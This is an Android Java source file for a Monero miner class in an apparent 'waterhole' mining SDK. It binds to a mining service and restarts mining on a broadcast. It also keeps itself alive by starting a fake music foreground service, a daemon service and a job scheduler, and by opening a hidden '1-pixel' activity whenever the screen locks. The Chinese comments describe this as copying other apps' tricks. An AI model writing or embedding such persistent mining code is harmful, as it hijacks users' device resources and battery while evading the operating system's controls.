package waterhole.miner.monero;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.io.ObjectStreamException;

import waterhole.miner.core.MinerInterface;
import waterhole.miner.core.WaterholeMiner;
import waterhole.miner.core.utils.LogUtils;
import waterhole.miner.monero.keepappalive.receiver.ScreenReceiverUtil;
import waterhole.miner.monero.keepappalive.service.DaemonService;
import waterhole.miner.monero.keepappalive.service.PlayerMusicService;
import waterhole.miner.monero.keepappalive.utils.JobSchedulerManager;
import waterhole.miner.monero.keepappalive.utils.ScreenManager;

import static waterhole.miner.core.utils.LogUtils.error;
import static waterhole.miner.core.utils.LogUtils.errorWithReport;
import static waterhole.miner.core.utils.LogUtils.info;

public final class XmrMiner extends WaterholeMiner {

    private IMiningServiceBinder mServiceBinder;
    private MineReceiver mineReceiver;

    private final ServiceConnection mServerConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            try {
                info("XmrMiner onServiceConnected");
                mServiceBinder = IMiningServiceBinder.MiningServiceBinder.asInterface(iBinder);
                mServiceBinder.startMine();
                mServiceBinder.setControllerNeedRun(true);
                if (topTemperature != -1) {
                    mServiceBinder.setTemperature(topTemperature);
                }
            } catch (Exception e) {
                errorWithReport(getContext(), "XmrMiner|ServiceConnection: " + e.getMessage());
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            mServiceBinder = null;
        }
    };

    // 1像素Activity管理类
    private ScreenManager mScreenManager;

    private ScreenReceiverUtil.SreenStateListener mScreenListenerer = new ScreenReceiverUtil.SreenStateListener() {
        @Override
        public void onSreenOn() {
            // 亮屏，移除"1像素"
            mScreenManager.finishActivity();
        }

        @Override
        public void onSreenOff() {
            // 接到锁屏广播，将SportsActivity切换到可见模式
            // "咕咚"、"乐动力"、"悦动圈"就是这么做滴
//            Intent intent = new Intent(SportsActivity.this,SportsActivity.class);
//            startActivity(intent);
            // 如果你觉得，直接跳出SportActivity很不爽
            // 那么，我们就制造个"1像素"惨案
            mScreenManager.startActivity();
        }

        @Override
        public void onUserPresent() {
            // 解锁，暂不用，保留
        }
    };

    public boolean isMining() {
        return mServiceBinder != null;
    }

    private XmrMiner() {
    }

    public static XmrMiner instance() {
        return Holder.instance;
    }

    private static class Holder {
        private static XmrMiner instance = new XmrMiner();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    @Override
    public MinerInterface init(Context context) {
        MinerInterface minerInterface = super.init(context);
        try {
            JobSchedulerManager jobManager = JobSchedulerManager.getJobSchedulerInstance(context);
            jobManager.startJobScheduler();

            ScreenReceiverUtil screenListener = new ScreenReceiverUtil(context);
            mScreenManager = ScreenManager.getScreenManagerInstance(context);
            screenListener.setScreenReceiverListener(mScreenListenerer);

            LogUtils.info("start keep alive service");
            // 3. 启动前台Service
            Intent intent_0 = new Intent(context, PlayerMusicService.class);
            context.startService(intent_0);
            // 4. 启动播放音乐Service

            Intent intent_1 = new Intent(context, DaemonService.class);
            context.startService(intent_1);
        } catch (Exception e) {
            error(e.getMessage());
        }
        return minerInterface;
    }

    @Override
    public void startMine() {
        info("XmrMiner startMine");
        if (mineReceiver == null) {
            mineReceiver = new MineReceiver();
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("waterhole.miner.monero.restart");
            getContext().registerReceiver(mineReceiver, intentFilter);
        }
        final Intent intent = new Intent(getContext(), MineService.class);
        getContext().bindService(intent, mServerConnection, Context.BIND_AUTO_CREATE);
    }

    @Override
    public void stopMine() {
        try {
            info("XmrMiner stopMine");
            if (mServiceBinder != null) {
                getContext().unbindService(mServerConnection);
                getContext().unregisterReceiver(mineReceiver);
                mineReceiver = null;
                mServiceBinder = null;
            }
        } catch (Exception e) {
            errorWithReport(getContext(), "XmrMiner|stopMine: " + e.getMessage());
        }
    }

    public class MineReceiver extends BroadcastReceiver {

        public MineReceiver() {
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            info("XmrMiner$MineReceiver onReceive");
            stopMine();
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    startMine();
                }
            }, 1000);
        }
    }
}
